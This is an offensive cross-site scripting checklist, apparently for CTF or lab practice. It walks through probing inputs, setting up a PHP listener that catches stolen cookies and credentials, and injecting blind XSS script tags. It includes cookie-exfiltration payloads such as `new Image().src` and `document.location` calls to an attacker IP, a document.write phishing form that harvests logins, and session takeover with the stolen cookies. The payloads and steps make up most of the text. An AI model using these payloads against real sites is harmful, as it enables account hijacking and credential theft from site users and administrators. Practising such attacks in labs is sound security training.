# XSS Checklist

## Recon
- [ ] curl the page, grep for all input fields (`input`, `textarea`, `form`, `name=`)
- [ ] Find all pages with forms (blog posts, registration, contact, feedback, search)
- [ ] Note form action URL, method (GET/POST), and ALL hidden fields (e.g., `comment_post_ID`)
- [ ] curl any referenced JS files, grep for sinks (`innerHTML`, `document.write`, `.html(`)
- [ ] Check if page mentions "admin will review" → signals Blind XSS opportunity

## Identify XSS Type
- [ ] Probe each parameter with invalid-format input to trigger error path: `curl "?param=PROBE123" | grep PROBE123`
- [ ] Also probe with valid-format input — some fields only reflect on error path, not success path
- [ ] Reflected in response → Reflected XSS
- [ ] Not reflected in response, but JS reads URL params → DOM XSS (check script source for sinks)
- [ ] Not reflected, form has admin review → Blind XSS (Stored)
- [ ] Identify HTML context of reflection (between tags, in attribute, in JS) to select correct breakout

## Confirm XSS Works
- [ ] Try `<script>alert(window.origin)</script>` first
- [ ] If page uses innerHTML sink → try `<img src=x onerror=alert(1)>` (script tags blocked)
- [ ] If alert() blocked → try `<script>print()</script>` or `<plaintext>`
- [ ] For Stored XSS: submit payload then **REFRESH** — alert fires on page load, not on submission
- [ ] For Reflected XSS: paste full URL with payload in browser address bar
- [ ] For DOM XSS: use `#param=` fragment in URL

## PHP Listener Setup
- [ ] `mkdir /tmp/tmpserver && cd /tmp/tmpserver`
- [ ] Write `index.php`:
  - Cookie catcher: handles `?c=` param, writes to `cookies.txt`
  - Credential catcher: handles `?username=&password=`, redirects back to target, writes to `creds.txt`
- [ ] Write `script.js`: `new Image().src='http://<IP>:<PORT>/index.php?c='+document.cookie;`
- [ ] Start server: `sudo php -S 0.0.0.0:8000` (port 80 often occupied)
- [ ] Verify: `curl http://<OUR_IP>:8000/test` → confirm GET /test in PHP terminal

## Blind XSS — Field Detection (Two Steps)
**Step 1: Find vulnerable field and working breakout**
- [ ] Submit with different field names in probe URL path: `<script src=http://<IP>:8000/fieldname></script>`
- [ ] Try all three breakout variants per field: no breakout, `'>`, `">`
- [ ] Keep CMS required fields (name, email) clean — validation rejects XSS payloads
- [ ] Include ALL hidden fields in POST (e.g., `comment_post_ID`) — missing them silently fails
- [ ] Use `--data-urlencode` for XSS payload fields, `-d` for clean/hidden fields
- [ ] Wait 30-60 seconds after submission; if nothing, try next variant

**Step 2: Deliver cookie stealer using confirmed breakout**
- [ ] Replace fieldname probe with `script.js` URL using confirmed breakout
- [ ] Watch for GET /script.js → GET /index.php?c=... sequence in PHP terminal
- [ ] If script.js fetched but no cookie call → swap `new Image().src` for `document.location`

**Key distinction:**
- [ ] Plain URL in website field → browser FETCHES it (img/link resource) — NOT executed as JS
- [ ] `"><script src=URL>` in website field → browser EXECUTES it as JS — this is what we need

## Phishing Attack
- [ ] Find vulnerable reflected input field
- [ ] Identify form element ID to remove with browser inspector (`CTRL+SHIFT+C`)
- [ ] Build payload: `document.write('<login form html>'); document.getElementById('<ID>').remove();`
- [ ] Append `<!--` to comment out remaining HTML
- [ ] Start credential catcher PHP server
- [ ] Deliver via crafted URL (Reflected) or stored input (Stored)
- [ ] Read: `cat /tmp/tmpserver/creds.txt`

## Cookie Stealing (Non-Blind)
- [ ] Use `<script>alert(document.cookie)</script>` to confirm cookie is accessible
- [ ] If accessible, steal with `document.location='http://<IP>/index.php?c='+document.cookie`

## Session Takeover
- [ ] Open target login page in browser
- [ ] `Shift+F9` → Storage → `+` → add stolen cookie (Name = before `=`, Value = after `=`)
- [ ] If multiple cookies stolen, check all — flag may be in a cookie named `flag`, not the session cookie
- [ ] Refresh page → confirm access
